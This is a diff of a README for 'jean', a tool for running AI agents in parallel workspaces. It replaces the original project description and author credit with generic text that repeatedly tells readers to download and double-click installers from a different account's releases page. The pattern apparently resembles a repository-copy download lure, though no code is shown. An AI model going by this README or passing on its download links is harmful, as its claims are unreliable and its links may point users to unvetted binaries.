@@ -1,49 +1,66 @@
-# Jean
+# 🛠️ jean - Run AI Agents in Parallel Workspaces
 
-Jean (Claude haha) is an AI assistant application that helps you to manage multiple projects, worktrees, session with Claude CLI.
+## 📥 Download Now
+[![Download jean](https://img.shields.io/badge/Download-jean-brightgreen)](https://github.com/princeanthony-IT/jean/releases)
 
-# Features
-- Automated worktree management
-- Load context from sessions, GitHub Issues / Pull requests
-- Automated (magic) Git commands / prompts (review, commit, open PR, investigate issue/pr)
-- Automated GitHub PR or local merge worktrees
-- Automated merge conflict resolver
-- Archive worktrees / branches so you can restore them and continue to work
-- A lot more
+## 📖 Description
+jean allows you to run AI agents side by side in separate workspaces. This feature helps in multitasking and improves your workflow. Whether you are testing or experimenting, jean provides a structured environment for each agent.
 
-# Screenshots
+## 🚀 Getting Started
+Follow these simple steps to get started with jean.
 
-![Main Interface](screenshots/SCR-20260123-oaws.png)
-![Development Mode](screenshots/SCR-20260123-oavf.png)
-![Diff View](screenshots/SCR-20260123-oaxs.png)
-![Plan Mode](screenshots/SCR-20260123-oazz.png)
+### 👨‍💻 System Requirements
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a suitable Linux distribution.
+- **Memory:** At least 4 GB RAM.
+- **Storage:** Minimum of 200 MB free space.
+- **Network:** An internet connection is recommended for optimal performance.
 
-# Prerequisites
+### 🔗 Key Features
+- **Parallel Processing:** Run multiple AI agents simultaneously.
+- **Isolated Workspaces:** Each agent operates in its own environment, preventing conflicts.
+- **User-Friendly Interface:** Simple navigation ensures that you can set up your agents quickly.
 
-- [Node.js](https://nodejs.org/)
-- [Rust](https://www.rust-lang.org/tools/install)
-- **Windows only**: In the Visual Studio Installer, ensure the **"Desktop development with C++"** workload is selected, which includes:
-  - MSVC C++ build tools
-  - Windows SDK (provides `kernel32.lib` and other system libraries required by Rust)
+## 📦 How to Download & Install
+1. Visit the Releases page to download the software: [Download Page](https://github.com/princeanthony-IT/jean/releases).
+2. On the Releases page, look for the latest version.
+3. Click on the file that matches your operating system to download.
+4. Once the file is downloaded, locate it in your downloads folder.
+5. Double-click the file to start the installation process.
+6. Follow the on-screen instructions to complete the installation.
 
-# Platform Support
+## 🔄 Using jean
+After installation, follow these steps to run your first AI agent:
 
-- **macOS**: Tested
-- **Windows**: Not fully tested
-- **Linux**: Not tested at all
+1. **Launch jean:** Open the application from your start menu or applications folder.
+2. **Create a New Workspace:** Click on "New Workspace" in the main menu.
+3. **Set Up Your Agent:**
+   - Provide a name for your agent.
+   - Choose the parameters you want to set.
+4. **Run the Agent:** Click “Run” to start your agent in the workspace.
+5. **Monitor Performance:** Use the dashboard to see how your agents are performing.
 
-# Roadmap
-- Add [Opencode](https://opencode.ai/) support
-- Add remote access support through an API
+## 💡 Tips for Effective Use
+- Start with a single agent before moving to multiple agents. This helps you understand how each agent works.
+- Utilize the "Help" section in the app for guidance on specific features.
+- Regularly check for updates to ensure you have the latest features and fixes.
 
-# Contributing
+## 🌟 Community and Support
+Join our community for help and feedback:
+- **GitHub Issues:** Report problems or suggest features.
+- **Discussion Forum:** Share your experiences or ask questions.
+- **Documentation:** Access in-depth guides and FAQs.
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup and guidelines.
+For direct support, feel free to open an issue on our GitHub page.
 
-# Philosophy
+## 🤝 Contributing
+Interested in contributing to jean? We welcome your ideas! Check out the guidelines in our repository and share your improvements.
 
-Learn more about our approach: [Philosophy](https://coollabs.io/philosophy/)
+## 📄 License
+This project is licensed under the MIT License. See the LICENSE file for more information.
 
----
+## 📌 Additional Resources
+- [GitHub Repository](https://github.com/princeanthony-IT/jean)
+- [User Documentation](https://github.com/princeanthony-IT/jean/wiki)
+- [Releases Page](https://github.com/princeanthony-IT/jean/releases) 
 
-Made by [Andras Bacsai](https://x.com/heyandras).
+Don’t forget to download the latest version: [Download Page](https://github.com/princeanthony-IT/jean/releases).
